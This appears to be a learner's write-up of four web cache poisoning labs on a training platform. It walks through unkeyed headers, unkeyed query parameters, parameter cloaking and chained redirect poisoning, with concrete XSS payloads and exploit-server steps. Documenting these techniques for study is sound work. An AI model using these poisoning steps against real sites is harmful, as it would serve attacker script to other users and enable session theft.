# High-level summary

Web cache poisoning tricks a shared cache into storing attacker-controlled responses so other users later receive malicious content. These attacks exploit differences in how caches and origin servers treat request headers, query parameters, or URL paths. Think of it like slipping a malicious flyer into a community mailbox that everyone reads.

## Lab 1 — Web cache poisoning with an unkeyed header

**What this teaches:** How an unkeyed request header (X-Forwarded-Host) can be used to make the cache store attacker-supplied resources.

**Simple beginner walkthrough:**

1. Open the site in Burp and send the home-page GET request to Repeater.
2. Add a cache-buster query string (e.g. `?cb=1234`) and add the header `X-Forwarded-Host: example.com`, then send the request and observe the response imports `/resources/js/tracking.js` built from that header.
3. On the exploit server, create `/resources/js/tracking.js` with the body `alert(document.cookie)` and store it.
4. Replay the home-page request in Repeater with `X-Forwarded-Host` set to your exploit server (e.g. `YOUR-ID.exploit-server.net`) until the response shows `X-Cache: hit` and the exploit URL is reflected.
5. As a victim, load the poisoned home page before the cache expires to trigger the `alert()` and solve the lab.

![image alt](https://github.com/Lispectree/web-sec/blob/41bcf3a21aa9f0490156349b0a722f6589e6b76e/web-security-labs/labs/web-cache-poisoning/WEB%20POIS%20LAB1%20PHOTO1.jpg)
This shows a web cache is being used and a file is loaded from the websec academy by the response


![image alt](https://github.com/Lispectree/web-sec/blob/a827de3b7da047c691b5896ad06947b387c9ff74/web-security-labs/labs/web-cache-poisoning/WEB%20POIS%20LAB1%20PHOTO2.jpg)
Use param miner to get the unkeyed header where you can add the attacker controlled url
## Lab 2 — Web cache poisoning via an unkeyed query parameter

**What this teaches:** How an unkeyed query parameter (utm_content) reflected in responses can allow stored XSS via the cache.

**Simple beginner walkthrough:**

1. Use the home page as a cache oracle and confirm the query string affects cache hits; add a cache-buster parameter to help testing.
2. Use a parameter discovery tool (Param Miner) or manual testing to find `utm_content` and confirm adding it still yields cache hits (it’s unkeyed) and its value is reflected in the response.
3. Send a request with `utm_content` set to an XSS payload, e.g. `/'/><script>alert(1)</script>`, and wait until the response is cached (`X-Cache: hit`).
4. Remove the `utm_content` parameter, copy the resulting URL and open it in a browser to confirm the alert triggers for users who load the cached page.
5. Keep replaying the poisoning request as needed until the victim loads the poisoned page and the lab is solved.

![image alt](https://github.com/Lispectree/web-sec/blob/66c12676db904da1b4fa08394abef7ce5f2344ea/web-security-labs/labs/web-cache-poisoning/WEB%20POIS%20LAB2%20PHOTO1.jpg)
The use of cache


![image alt](https://github.com/Lispectree/web-sec/blob/bc345e02e84cbcf3f279e2dfbdcb246e13d4a7e8/web-security-labs/labs/web-cache-poisoning/WEB%20POIS%20LAB2%20PHOTO2.jpg)
The param miner shows query


![image alt](https://github.com/Lispectree/web-sec/blob/53102ed561b7c6d5953d10dac27d4fcf9c547d7d/web-security-labs/labs/web-cache-poisoning/WEB%20POIS%20LAB2%20PHOTO3.jpg)
Alert is shown in the response
`

## Lab 3 — Web cache poisoning via parameter cloaking

**What this teaches:** How Rails-style parameter cloaking (semicolon in a parameter) can hide attacker-controlled parameters from cache keys and enable poisoning.

**Simple beginner walkthrough:**

1. Confirm `utm_content` is supported and excluded from the cache key by testing different values and observing cache hits/misses.
2. Observe `/js/geolocate.js?callback=setCountryCookie` is imported by pages — send this request to Repeater and note the `callback` parameter controls the function name in the response.
3. Append a second `callback` using a semicolon inside `utm_content`, for example: `?callback=setCountryCookie&utm_content=foo;callback=arbitraryFunction`. Send the request and note the response uses `arbitraryFunction(...)` while the cache key omits the `utm_content` part.
4. Replace `arbitraryFunction` with `alert(1)` (URL-encode as needed): `?callback=setCountryCookie&utm_content=foo;callback=alert(1)`. Get the response cached, then load a page that imports `/js/geolocate.js` to trigger the alert. Replay the request periodically to keep the cache poisoned until the victim loads the page.
5. The lab is solved when a victim visits a page that includes the poisoned `/js/geolocate.js` resource.
   ![image alt](https://github.com/Lispectree/web-sec/blob/3f0dccaf7c9b457699838e682bb4edea8bdb5b8b/web-security-labs/labs/web-cache-poisoning/WEB%20POIS%20LAB3%20PHOTO1.jpg)
   The request that gets saved in the cache


![image alt](https://github.com/Lispectree/web-sec/blob/0ae7815ff541389231853c73cddd4beeaf384358/web-security-labs/labs/web-cache-poisoning/WEB%20POIS%20LAB3%20PHOTO2.jpg)
The param miner identified the header


![image alt](https://github.com/Lispectree/web-sec/blob/b6d86421cb6bffe00b3f11f83e9de28bbd3d2b63/web-security-labs/labs/web-cache-poisoning/WEB%20POIS%20LAB3%20PHOTO3.jpg)
A script is added to that header
The lab is solved when the page is accessed by the target





## Lab 4 — Combining web cache poisoning vulnerabilities

**What this teaches:** How multiple cache-poisoning techniques (unkeyed header + redirect cloaking) can be chained to force users to load a poisoned resource.

**Simple beginner walkthrough:**

1. Create a malicious translations JSON on the exploit server at `/resources/json/translations.json` containing an XSS payload inside one language's translation (for example Spanish `es`), and add `Access-Control-Allow-Origin: *` in the response headers.
2. In Burp, find a request for `/?localized=1` that uses the `lang=es` cookie. Send it to Repeater, add a cache-buster, and set `X-Forwarded-Host: YOUR-EXPLOIT-SERVER-ID.exploit-server.net`. Send until the response shows your exploit URL reflected and `X-Cache: hit` to poison the localized page.
3. Next, force users into the poisoned language: send the home-page request and add the header `X-Original-URL: /setlang\es` (note the backslash). The server normalizes this and returns a cacheable `302` redirect to `/setlang/es` that other users will follow. Get that redirect cached (`X-Cache: hit`).
4. While both cache entries remain poisoned, load the English home page in a browser to simulate a victim: you should be redirected to the Spanish localized page and see the injected `alert()` fire.
5. Replay both poisoning requests as needed to keep the cache entries active until the victim visits the site and the lab is solved.

![image alt](https://github.com/Lispectree/web-sec/blob/0b7ebd3ecc3a9897e7ef770e74851eba0e105633/web-security-labs/labs/web-cache-poisoning/WEB%20POIS%20LAB4%20PHOTO1.jpg)
You can manipulate the host header


![image alt](https://github.com/Lispectree/web-sec/blob/18883384ebf29893c6e7109673f870a034c2850b/web-security-labs/labs/web-cache-poisoning/WEB%20POIS%20LAB4%20PHOTO2.jpg)
The translation page poisoned
